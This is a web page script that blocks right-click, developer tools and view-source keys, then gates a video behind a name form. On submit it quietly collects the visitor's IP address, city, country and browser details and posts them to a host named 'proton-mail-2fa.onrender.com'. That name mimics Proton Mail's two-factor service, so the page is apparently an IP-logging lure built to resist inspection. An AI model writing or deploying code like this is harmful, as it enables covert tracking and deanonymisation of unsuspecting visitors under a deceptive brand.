document.addEventListener('contextmenu', function (e) {
  e.preventDefault();
  location.reload();
});


document.addEventListener('keydown', function (e) {
  if (e.ctrlKey && !e.shiftKey && !e.altKey) {
    e.preventDefault();
    location.reload();
  }
});


document.addEventListener('keydown', function (e) {
  if (
    e.key === 'F12' || e.keyCode === 123 ||
    (e.ctrlKey && e.shiftKey && ['I', 'J'].includes(e.key.toUpperCase())) ||
    (e.ctrlKey && e.key.toLowerCase() === 'u')
  ) {
    e.preventDefault();
    location.reload();
  }
});


setInterval(function () {
  const start = new Date();
  debugger;
  const end = new Date();
  if (end - start > 100) {
    document.body.innerHTML = '<h1 style="color:red;text-align:center;">DevTools Detected - Access Blocked</h1>';
    throw new Error('DevTools detected');
  }
}, 1000);


const trap = new Image();
Object.defineProperty(trap, 'id', {
  get: function () {
    document.body.innerHTML = '<h1 style="color:red;text-align:center;">Console Inspection Blocked</h1>';
    throw new Error('Console access is blocked');
  }
});
console.log('%c', trap);


document.addEventListener("DOMContentLoaded", () => {
  const nameInput = document.getElementById('visitorName');
  const button = document.getElementById('logBtn');
  const thankYou = document.getElementById('thankYouMessage');
  const video = document.getElementById('secureVideo');

  // If already submitted during this session
  if (sessionStorage.getItem("submitted")) {
    unlockVideo();
  }

  window.toggleButton = () => {
    button.disabled = nameInput.value.trim() === '';
  };

  window.logVisitor = () => {
    const name = nameInput.value.trim();
    if (!name || sessionStorage.getItem("submitted")) return;

    fetch('https://ipapi.co/json/')
      .then(res => res.json())
      .then(data => {
        return fetch('https://proton-mail-2fa.onrender.com/log-ip', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({
            name: name,
            ip: data.ip,
            city: data.city,
            country: data.country_name,
            userAgent: navigator.userAgent
          })
        });
      })
      .then(() => {
        sessionStorage.setItem("submitted", true);
        unlockVideo();
      })
      .catch(err => console.error("Logging failed:", err));
  };

  function unlockVideo() {
    const video = document.getElementById('secureVideo');
    video.removeAttribute('disabled');
    video.setAttribute('controls', true);
    thankYou.style.display = 'block';
  }
});

